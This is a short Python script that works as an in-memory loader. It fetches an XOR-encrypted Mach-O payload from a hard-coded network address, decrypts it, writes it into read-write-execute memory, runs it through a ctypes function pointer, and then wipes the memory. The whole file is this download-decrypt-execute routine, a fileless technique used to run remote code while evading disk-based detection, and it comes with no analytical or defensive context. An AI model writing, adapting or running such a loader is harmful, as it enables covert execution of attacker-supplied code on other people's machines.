#!/usr/bin/env python3
import ctypes
import mmap
import urllib.request
import sys

# Configuration
payload_url = "http://192.168.1.26/hello_macho_encrypted"
xor_key = 0x42  # example XOR key

# Fetch encrypted Mach-O payload
resp = urllib.request.urlopen(payload_url)
encrypted_payload = resp.read()

# Decrypt payload in memory
payload = bytearray(b ^ xor_key for b in encrypted_payload)

# Allocate RWX memory
size = len(payload)
mem = mmap.mmap(-1, size, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)

# Write decrypted Mach-O into memory
mem.write(payload)

# Create function pointer to memory
func_type = ctypes.CFUNCTYPE(None)
func = func_type(ctypes.addressof(ctypes.c_char.from_buffer(mem)))

# Execute Mach-O in memory
func()

# Optional: wipe memory
mem.seek(0)
mem.write(b"\x00" * size)
mem.close()
